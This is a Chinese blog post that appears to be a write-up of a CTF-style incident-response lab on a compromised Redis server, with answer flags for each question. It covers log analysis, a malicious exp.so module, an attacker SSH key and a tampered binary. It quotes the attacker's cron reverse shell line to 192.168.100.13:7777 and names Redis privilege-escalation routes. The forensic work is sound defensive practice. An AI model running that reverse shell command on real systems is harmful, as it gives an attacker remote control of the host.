---
title: 玄机第二章
published: 2026-01-17
description: 玄机第二章
tags: [玄机, 应急响应]
category: 玄机
draft: false
---

# 第二章日志分析-redis应急响应

## 通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;

```
cat /var/log/redis.log | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -nr
-E代表正则匹配，-o只输出“匹配到的部分”，+代表多个数字
```

挨个看

```
cat /var/log/redis.log | grep -Ea "192.168.100.13"

cat /var/log/redis.log | grep -Ea "192.168.100.20"| sort | uniq -c

cat /var/log/redis.log | grep -Ea "192.168.31.55"| sort | uniq -c
```

其中192.168.100.13攻击的最多

```
flag{192.168.100.13}
```



## 通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;

查看日志

```
cat /var/log/redis.log
```

前半段是黑客攻击爆破的日志，后面是成功的操作，我们着重看后面

![image-20260118110223890](./../../../public/pcb5-ez_java/image-20260118110223890-1768752745268-11.png)

在里面找到一个可疑的操作

```
Module 'system' loaded from ./exp.so
```

查看exp.so文件

```
strings -a -n 4 /exp.so | grep -aoE '(flag|FLAG|ctf|CTF)\{[^}]{0,200}\}'
```

其中

```
(flag|FLAG|ctf|CTF)

(...) 是分组

| 表示“或”

所以这一段匹配 flag / FLAG / ctf / CTF 这四种前缀之一

\{

匹配一个字面量的左大括号 {

因为 { 在正则里有特殊意义（表示重复次数），所以要用 \{ 进行转义

[^}]{0,200}

[...] 是字符集合

^ 放在集合开头表示“取反”

[^}] 表示“任意不是 } 的字符”

{0,200} 表示重复 0 到 200 次

所以这一段的意思是：抓大括号里面的内容，最多 200 个字符，不允许出现 }（这样就能在遇到第一个 } 时停住）

\}

匹配字面量的右大括号 }（同样要转义）
```

得到flag

```
flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}
```

## 通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;

对于redis数据库提权一般来说有4种方法

- 写密钥ssh
- 计划任务
- 反弹shell
- CVE-2022-0543 沙盒绕过命令执行 （集成在template当中）

这里面可以先排除反弹shell与CVE-2022-0543 因为反弹shell很容易出问题导致连接失败。

先看下有没有写公钥

```
cat /root/.ssh/authorized_keys 
```

![image-20260118110810717](./../../../public/pcb5-ez_java/image-20260118110810717-1768752745269-13.png)

可以看到是写了公钥的。但仅靠公钥我们是找不到反弹Ip的

查看计划任务

```
crontab -l
```

在结尾发现反弹shell命令

```
*/1 * * * *  /bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1

flag{192.168.100.13}
```

## 通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交

在公钥里面后面对应的就是黑客用户名

```
xj-test-user
```

去github里面搜用户名

![image-20260118111133310](./../../../public/pcb5-ez_java/image-20260118111133310-1768752745268-12.png)

![image-20260118111141551](./../../../public/pcb5-ez_java/image-20260118111141551-1768752745269-14.png)

```
flag{xj-test-user-wow-you-find-flag}
```



## 通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;

大多数Linux命令都是编译后的二进制可执行文件

这些可执行文件一般放置于 /bin、/sbin、/usr/bin、/usr/sbin 等目录中

我们到/bin目录 按照时间顺序查看最新的文件

```
ls -lt | head -n 10
-t 时间顺序
head 看前面几个
```



![image-20260115220549724](./../../../public/pcb5-ez_java/image-20260115220549724-1768752745269-15.png)

```
flag{c195i2923381905517d818e313792d196}
```

